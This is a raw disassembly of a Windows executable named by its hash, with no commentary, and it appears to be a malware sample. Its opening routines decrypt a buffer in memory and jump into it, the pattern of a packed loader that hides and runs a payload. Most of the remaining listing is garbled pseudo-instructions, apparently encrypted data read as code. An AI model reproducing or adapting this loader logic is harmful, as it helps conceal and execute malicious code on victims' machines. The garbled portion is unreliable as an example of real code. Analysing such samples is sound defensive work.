
06ef413fcfe93ca819c1fc5cca9261daf6a7072720eb5d8e2ea046c27e9b740e.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0x6586860f
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	mov    esi,DWORD PTR [edi+0x75]
  41145d:	mov    ebx,DWORD PTR [ebx+0x7ea89780]
  411463:	push   esp
  411464:	jmp    0x411486
  411466:	cwde   
  411467:	or     al,0xbf
  411469:	jl     0x4114db
  41146b:	retf   0x6ffa
  41146e:	xor    edx,DWORD PTR [esi+ebx*2+0xb]
  411472:	sub    ebx,DWORD PTR ds:0xffa6f997
  411478:	xor    bh,BYTE PTR [ebx]
  41147a:	jb     0x41146f
  41147c:	sub    al,0xfb
  41147e:	(bad)  
  41147f:	mov    edx,0x8f8848e2
  411484:	pop    esp
  411485:	ss ins BYTE PTR es:[edi],dx
  411487:	adc    eax,0xa68b53f4
  41148c:	dec    eax
  41148d:	mov    eax,0x13c4d5bc
  411492:	xor    al,0x9a
  411494:	int3   
  411495:	inc    esi
  411496:	repnz push 0xffffff90
  411499:	(bad)  
  41149a:	cmp    eax,0x2b9515b4
  41149f:	lds    edi,FWORD PTR [ebp+0x53]
  4114a2:	inc    esp
  4114a3:	lods   al,BYTE PTR ds:[esi]
  4114a4:	push   0x20c73b86
  4114a9:	jge    0x411471
  4114ab:	int    0x3b
  4114ad:	jae    0x411471
  4114af:	hlt    
  4114b0:	out    0xa7,al
  4114b2:	or     dl,dh
  4114b4:	adc    DWORD PTR [edi+0x74901dbd],edx
  4114ba:	add    eax,0x85ace4db
  4114bf:	mov    WORD PTR [eax+0x47],gs
  4114c2:	sbb    esp,DWORD PTR [eax]
  4114c4:	sub    eax,0xa144f9c7
  4114c9:	mov    bl,0xb4
  4114cb:	or     BYTE PTR ds:0x1a212cd5,0xd0
  4114d2:	gs mov ebx,0x10af5cd3
  4114d8:	jno    0x4114a1
  4114da:	xor    DWORD PTR [edi+0x4],esp
  4114dd:	rol    ecx,1
  4114df:	and    al,0x34
  4114e1:	sbb    BYTE PTR [ecx-0x35],ah
  4114e4:	xor    al,0xa4
  4114e6:	pop    edx
  4114e7:	add    ebp,DWORD PTR [eax-0x219a7f30]
  4114ed:	daa    
  4114ee:	mov    BYTE PTR [edi-0x5d],bh
  4114f1:	outs   dx,BYTE PTR ds:[esi]
  4114f2:	ret    0xeffa
  4114f5:	add    BYTE PTR [ebx-0x47],dh
  4114f8:	arpl   WORD PTR [edx],di
  4114fa:	sbb    eax,0xb4354648
  4114ff:	inc    ebp
  411500:	icebp  
  411501:	cmp    ecx,edi
  411503:	push   ds
  411504:	push   esi
  411505:	fisub  WORD PTR [ecx+0x47]
  411508:	ins    DWORD PTR es:[edi],dx
  411509:	and    bl,BYTE PTR ds:0x61d6b45b
  41150f:	ja     0x4114be
  411511:	mov    dl,0x8f
  411513:	out    0xe7,eax
  411515:	icebp  
  411516:	sbb    edx,ebp
  411518:	nop
  411519:	clc    
  41151a:	call   DWORD PTR [ebp-0x66]
  41151d:	sar    BYTE PTR [esi],1
  41151f:	dec    ebp
  411520:	or     ch,BYTE PTR [esp+edx*2+0x74]
  411524:	add    bh,ch
  411526:	pop    eax
  411527:	outs   dx,BYTE PTR ds:[esi]
  411528:	in     al,0x4b
  41152a:	cli    
  41152b:	add    BYTE PTR [ebp-0x35c05fba],ah
  411531:	ror    BYTE PTR [esi],0x42
  411534:	fdiv   QWORD PTR [ebx-0x4a0cb9fe]
  41153a:	imul   ebx,esp,0xffffffc1
  41153d:	rcr    BYTE PTR [eax],cl
  41153f:	sub    al,0x2b
  411541:	and    eax,0x74482250
  411546:	sub    BYTE PTR [ecx],cl
  411548:	add    dh,BYTE PTR [edi]
  41154a:	adc    DWORD PTR [edi],esp
  41154c:	and    BYTE PTR [ecx+0x670944f2],bh
  411552:	scas   al,BYTE PTR es:[edi]
  411553:	push   ebp
  411554:	imul   ebp,ebx,0x2f
  411557:	iret   
  411558:	xor    al,0xa8
  41155a:	loop   0x411587
  41155c:	cmp    ch,ah
  41155e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41155f:	iret   
  411560:	sti    
  411561:	sub    eax,0xaf35ed33
  411566:	sbb    ebx,DWORD PTR [edx+0x2f00f082]
  41156c:	ret    
  41156d:	mov    edx,DWORD PTR [esi-0x1c]
  411570:	mov    bl,0xed
  411572:	clc    
  411573:	and    eax,0x8b16d8e
  411578:	jmp    0x4115ad
  41157a:	call   0x92ba:0x8191dec1
  411581:	jae    0x4115ee
  411583:	mov    BYTE PTR [eax+0x4ab6c2f1],bh
  411589:	retf   
  41158a:	or     eax,0x2c5f47fa
  41158f:	ss mov bh,0x46
  411592:	arpl   WORD PTR [ebx+edi*8+0x28],bp
  411596:	mov    DWORD PTR [eax],edx
  411598:	push   edx
  411599:	xor    DWORD PTR [eax-0x6d6aa572],esp
  41159f:	adc    eax,0x18d63090
  4115a4:	push   0x3b
  4115a6:	xchg   ebp,eax
  4115a7:	inc    eax
  4115a8:	data16 xchg BYTE PTR [esi],dl
  4115ab:	cmp    ebx,DWORD PTR [ebx]
  4115ad:	add    dl,BYTE PTR [edi]
  4115af:	jnp    0x4115ca
  4115b1:	in     eax,0x1c
  4115b3:	lds    ebp,FWORD PTR [edx]
  4115b5:	mov    ebp,0x161819e8
  4115ba:	cld    
  4115bb:	add    DWORD PTR [esi],esi
  4115bd:	inc    esi
  4115be:	loope  0x411553
  4115c0:	fs ja  0x411572
  4115c3:	jmp    0xf5edb365
  4115c8:	mov    eax,DWORD PTR [ebx*1+0x1088ed9f]
  4115cf:	xchg   DWORD PTR [ecx],eax
  4115d1:	sub    dh,ah
  4115d3:	clc    
  4115d4:	mov    cl,0x9b
  4115d6:	or     DWORD PTR [esi+0x3f],ebp
  4115d9:	sbb    ebx,eax
  4115db:	dec    edi
  4115dc:	push   ecx
  4115dd:	sub    al,0x26
  4115df:	or     ebx,DWORD PTR [ebx-0x3800f245]
  4115e5:	mov    al,ds:0x18229bd8
  4115ea:	adc    ebp,ebx
  4115ec:	out    0xd0,al
  4115ee:	fnstsw WORD PTR [ebx]
  4115f0:	xchg   edx,eax
  4115f1:	pop    edi
  4115f2:	xor    esi,DWORD PTR [ebx-0x52]
  4115f5:	push   ecx
  4115f6:	es xor eax,0x8dc8e2b8
  4115fc:	pop    ecx
  4115fd:	scas   al,BYTE PTR es:[edi]
  4115fe:	(bad)  
  4115ff:	fnstenv [ecx-0x77f5c14c]
  411605:	test   DWORD PTR [ebx],esi
  411607:	inc    ebp
  411608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411609:	sbb    al,0x14
  41160b:	std    
  41160c:	xchg   esp,eax
  41160d:	scas   al,BYTE PTR es:[edi]
  41160e:	popa   
  41160f:	mov    dh,0xa6
  411611:	ror    eax,cl
  411613:	cli    
  411614:	and    ecx,DWORD PTR [ebx+eiz*4]
  411617:	daa    
  411618:	cmp    eax,0x63b136bf
  41161d:	(bad)  
  41161e:	scas   eax,DWORD PTR es:[edi]
  41161f:	(bad)  
  411620:	stos   DWORD PTR es:[edi],eax
  411621:	inc    esi
  411622:	or     dh,BYTE PTR ds:0x16d186f2
  411628:	pop    esp
  411629:	inc    ebx
  41162a:	repnz fild WORD PTR ds:0x6cee584c
  411631:	cmp    DWORD PTR [ecx+0x26],0xffffff8d
  411635:	dec    ebx
  411636:	lea    ebx,[edi-0x4]
  411639:	popa   
  41163a:	cld    
  41163b:	push   ds
  41163c:	cmp    eax,0xd5cd7350
  411641:	mov    fs,WORD PTR [edx-0x24412916]
  411647:	call   0xcd6a:0xadafc19a
  41164e:	mov    ah,0xa
  411650:	inc    ebp
  411651:	push   ebp
  411652:	xor    eax,0xd45fcb96
  411657:	mov    edx,0x2ae96759
  41165c:	loope  0x41162b
  41165e:	or     DWORD PTR [edi+0x25],0x35660681
  411665:	fldcw  WORD PTR [esi-0x7c]
  411668:	or     DWORD PTR [esi-0x5c],edx
  41166b:	dec    edx
  41166c:	mov    edi,0xaa347bc8
  411671:	mul    BYTE PTR [eax+ebp*2-0x44e66929]
  411678:	cmp    DWORD PTR [ecx-0x75],edx
  41167b:	cmp    BYTE PTR [ebx],bl
  41167d:	or     DWORD PTR [ebx+0x757138a3],esi
  411683:	fisttp QWORD PTR [ebx-0x2f377e31]
  411689:	sub    DWORD PTR [edi+0x55dc2eee],0x19
  411690:	aam    0xd3
  411692:	mov    al,ds:0xd51d0375
  411697:	iret   
  411698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411699:	daa    
  41169a:	jg     0x411683
  41169c:	mov    esi,0x860dbe68
  4116a1:	stos   DWORD PTR es:[edi],eax
  4116a2:	sub    ecx,DWORD PTR [esi]
  4116a4:	mov    ss,WORD PTR [ecx-0x11]
  4116a7:	mov    ah,0x17
  4116a9:	adc    ebp,edi
  4116ab:	out    0xed,al
  4116ad:	xchg   ebx,eax
  4116ae:	and    BYTE PTR [ebp-0x7],dl
  4116b1:	les    edx,FWORD PTR [edx+0x64f1c99d]
  4116b7:	cmp    bl,bl
  4116b9:	std    
  4116ba:	xor    eax,0xb7385589
  4116bf:	sub    cl,BYTE PTR [ecx-0x54]
  4116c2:	cs xchg ebp,eax
  4116c4:	pop    ecx
  4116c5:	pop    ss
  4116c6:	push   ebx
  4116c7:	mov    ecx,0xa13f88ad
  4116cc:	call   0x584c876f
  4116d1:	push   esp
  4116d2:	es dec ecx
  4116d4:	dec    ebx
  4116d5:	mov    edi,0x3a2e84e3
  4116da:	sub    eax,0x264c56ea
  4116df:	inc    esp
  4116e0:	in     al,dx
  4116e1:	push   0x17e0df89
  4116e6:	sub    eax,0xe9d91a52
  4116eb:	aad    0xa6
  4116ed:	scas   eax,DWORD PTR es:[edi]
  4116ee:	jns    0x411704
  4116f0:	push   ss
  4116f1:	fisttp WORD PTR [ecx]
  4116f3:	sti    
  4116f4:	inc    edi
  4116f5:	ret    0x7b57
  4116f8:	call   0xdf0404c1
  4116fd:	popa   
  4116fe:	out    dx,eax
  4116ff:	test   BYTE PTR [ebx],dh
  411701:	pop    ecx
  411702:	arpl   WORD PTR [eax-0x60],sp
  411705:	pop    ss
  411706:	jg     0x411770
  411708:	add    DWORD PTR ds:0x5f8c0c37,0x998d09e5
  411712:	cs push esp
  411714:	cmc    
  411715:	loope  0x4116c5
  411717:	sbb    ah,BYTE PTR [edx-0x67056dcb]
  41171d:	xor    DWORD PTR [ebx],esp
  41171f:	repz aam 0xb6
  411722:	jne    0x41177e
  411724:	rcr    DWORD PTR [esi],1
  411726:	jno    0x4116b5
  411728:	fstp   DWORD PTR [esi+ecx*2-0x47]
  41172c:	mov    bl,0x63
  41172e:	ja     0x4116b7
  411730:	add    DWORD PTR [eax-0x6fec2491],ebx
  411736:	fwait
  411737:	ss mov eax,edi
  41173a:	jp     0x411710
  41173c:	test   al,0xc3
  41173e:	fisttp WORD PTR [edx+0xb]
  411741:	aad    0x43
  411743:	add    eax,0x79aa7452
  411748:	sub    eax,edx
  41174a:	and    esp,ebp
  41174c:	xor    dl,BYTE PTR [eax]
  41174e:	inc    DWORD PTR [eax-0x5a4e594d]
  411754:	loopne 0x411729
  411756:	(bad)  
  411757:	out    dx,eax
  411758:	mov    bh,0xc5
  41175a:	arpl   WORD PTR [ebx-0x3c5821d2],bx
  411760:	shl    BYTE PTR [eax-0x32],0x89
  411764:	and    BYTE PTR [edi+edi*2-0x2d982df7],0x3f
  41176c:	xor    al,ch
  41176e:	std    
  41176f:	push   ecx
  411770:	mov    gs,WORD PTR [eax+ebx*1-0x65]
  411774:	sub    DWORD PTR [esp+ecx*8],edi
  411777:	div    DWORD PTR [ebx]
  411779:	lahf   
  41177a:	cmp    ecx,DWORD PTR [ebx+0x2ddae75a]
  411780:	mov    ebx,0xb390e0c9
  411785:	jp     0x4117b5
  411787:	fcmovbe st,st(6)
  411789:	sahf   
  41178a:	sbb    DWORD PTR fs:[edx-0x27],esp
  41178e:	test   eax,0x4f038186
  411793:	push   ebp
  411794:	mov    al,0x4
  411796:	in     al,dx
  411797:	cmc    
  411798:	int3   
  411799:	je     0x4117f4
  41179b:	(bad)  
  41179c:	les    esp,FWORD PTR [edi-0x23]
  41179f:	push   esi
  4117a0:	in     al,dx
  4117a1:	dec    ebx
  4117a2:	ja     0x41174f
  4117a4:	xchg   edx,eax
  4117a5:	fild   DWORD PTR ds:[ecx-0x7c5a9c65]
  4117ac:	mov    DWORD PTR [ebx-0x668b8f4e],ebp
  4117b2:	ret    0x95a4
  4117b5:	rcl    BYTE PTR [esi+0x13d17076],1
  4117bb:	add    ch,0x5
  4117be:	cmp    bl,al
  4117c0:	iret   
  4117c1:	stos   DWORD PTR es:[edi],eax
  4117c2:	scas   eax,DWORD PTR es:[edi]
  4117c3:	jmp    0x7d329430
  4117c8:	(bad)  
  4117c9:	clc    
  4117ca:	neg    DWORD PTR [eax+0x36]
  4117cd:	adc    edx,eax
  4117cf:	cmc    
  4117d0:	and    dh,BYTE PTR [edi-0x4f]
  4117d3:	push   es
  4117d4:	sahf   
  4117d5:	ficomp DWORD PTR [edi]
  4117d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d8:	mov    DWORD PTR [ebp-0x56],ebx
  4117db:	shr    DWORD PTR [ebp+esi*1+0x57247a4],0x19
  4117e3:	dec    edx
  4117e4:	mov    WORD PTR [edx],?
  4117e6:	sub    DWORD PTR [edi-0x2d],0x2119e26d
  4117ed:	popa   
  4117ee:	xlat   BYTE PTR ds:[ebx]
  4117ef:	xchg   edi,eax
  4117f0:	invd   
  4117f2:	add    DWORD PTR [eax+0x45],esp
  4117f5:	neg    DWORD PTR [esp+ebp*8-0x2770141e]
  4117fc:	cmc    
  4117fd:	(bad)  
  4117fe:	cmc    
  4117ff:	pushf  
  411800:	pop    eax
  411801:	stc    
  411802:	cmp    eax,0x99b07872
  411807:	data16 loop 0x41179f
  41180a:	fcom   QWORD PTR [edx+ecx*8-0x498b3d87]
  411811:	pop    ecx
  411812:	add    dl,BYTE PTR [ecx-0x8]
  411815:	pop    esi
  411816:	mov    al,ds:0x165aeb2b
  41181b:	ins    BYTE PTR es:[edi],dx
  41181c:	sti    
  41181d:	enter  0x9d8e,0xab
  411821:	(bad)  
  411822:	bound  ebx,QWORD PTR ds:0x4b17
  411827:	and    al,0x40
  411829:	jmp    0xc2b6da9e
  41182e:	scas   al,BYTE PTR es:[edi]
  41182f:	sbb    edx,eax
  411831:	lea    eax,[ebx-0x70571622]
  411837:	push   esp
  411838:	scas   eax,DWORD PTR es:[edi]
  411839:	test   BYTE PTR [edi],ah
  41183b:	pop    es
  41183c:	in     al,0x29
  41183e:	loop   0x4118a4
  411840:	xor    DWORD PTR [eax-0xb],edx
  411843:	mov    ebx,0x20b3d706
  411848:	jne    0x4117d9
  41184a:	sbb    eax,0xd0747a8d
  41184f:	jp     0x4118a5
  411851:	outs   dx,BYTE PTR ds:[esi]
  411852:	mov    cl,0x5a
  411854:	rcr    dh,cl
  411856:	jbe    0x4118a3
  411858:	mov    ecx,0xe5963b00
  41185d:	rcl    eax,cl
  41185f:	lds    esp,FWORD PTR [ebp-0x67]
  411862:	sub    ecx,ebp
  411864:	push   esp
  411865:	sbb    eax,0x4092eb04
  41186a:	push   es
  41186b:	out    dx,al
  41186c:	cmp    BYTE PTR [eax-0x2e],cl
  41186f:	xor    eax,0xd2544e53
  411874:	and    DWORD PTR [ebp-0x75526680],0xffffffaf
  41187b:	call   0xcbb7550f
  411880:	cmp    BYTE PTR [ecx-0x773c42a],cl
  411886:	fs xor eax,0x370699e9
  41188c:	out    0x24,al
  41188e:	push   ss
  41188f:	and    eax,0x98969b70
  411894:	push   edi
  411895:	push   ebx
  411896:	sub    BYTE PTR [ebx],0x5
  411899:	adc    BYTE PTR [ecx+ebx*2-0x7],ah
  41189d:	adc    ebp,ebp
  41189f:	cli    
  4118a0:	push   eax
  4118a1:	push   ebp
  4118a2:	sti    
  4118a3:	cmp    esp,ecx
  4118a5:	retf   
  4118a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a7:	push   cs
  4118a8:	adc    DWORD PTR [ebx+0x28],esi
  4118ab:	push   0x7fc3204a
  4118b0:	adc    al,0xe3
  4118b2:	hlt    
  4118b3:	outs   dx,DWORD PTR ds:[esi]
  4118b4:	jbe    0x4118f3
  4118b6:	iret   
  4118b7:	cld    
  4118b8:	jmp    0x13cdba35
  4118bd:	xchg   esi,eax
  4118be:	sub    al,0xe9
  4118c0:	test   eax,0x2737d1ec
